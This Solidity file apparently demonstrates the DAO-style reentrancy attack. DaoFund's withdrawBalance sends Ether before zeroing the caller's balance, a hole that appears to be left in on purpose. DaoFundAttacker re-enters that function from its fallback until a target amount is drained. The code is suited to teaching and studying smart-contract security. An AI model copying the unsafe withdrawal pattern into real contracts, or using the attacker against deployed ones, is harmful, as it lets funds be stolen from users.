pragma solidity ^0.4.18;

contract DaoFund{

   mapping(address=>uint) balanceOf;

   event WithdrawBalance(string message,uint gas);

   function getUserBalance(address user) external view returns(uint) {
     return balanceOf[user];
   }

   function addToBalance() external payable {
     balanceOf[msg.sender] = balanceOf[msg.sender] + msg.value;
   }

   function withdrawBalance() external {
     uint amountToWithdraw = balanceOf[msg.sender];
    WithdrawBalance("withdrawBalance",msg.gas);
     if (msg.sender.call.value(amountToWithdraw)() == false) {
         revert();
     }
     balanceOf[msg.sender] = 0;
   }
}

contract DaoFundAttacker{
   address fundAddress;
   int goalAmount;
   
   event WithdrawBalance(string message,uint gas);

   function  DaoFundAttacker(address _fundAddress) public {
       fundAddress=_fundAddress;
   }

   function() public payable {

       goalAmount -= int(msg.value);

       if( goalAmount > 0 )
       {
           if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
               WithdrawBalance("Succeeded in fallback",msg.gas);
           }
           else WithdrawBalance("Failed in fallback",msg.gas);
       }
       else {
           WithdrawBalance("All the goal amount withdraweAll the goal amount withdrawed.",msg.gas);
       }
   }

   function  deposit() public payable {
        if(fundAddress.call.value(msg.value).gas(20764)(bytes4(keccak256("addToBalance()"))) ==false) {
               revert();
        }
   }

   function  withdraw(uint _goalAmount) public {
       goalAmount = int(_goalAmount * 1 ether);
       
        if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))==false ) {
               WithdrawBalance("Failed in withdraw",msg.gas);
               revert();
        }
        else WithdrawBalance("Succeeded in withdraw",msg.gas);
   }
}
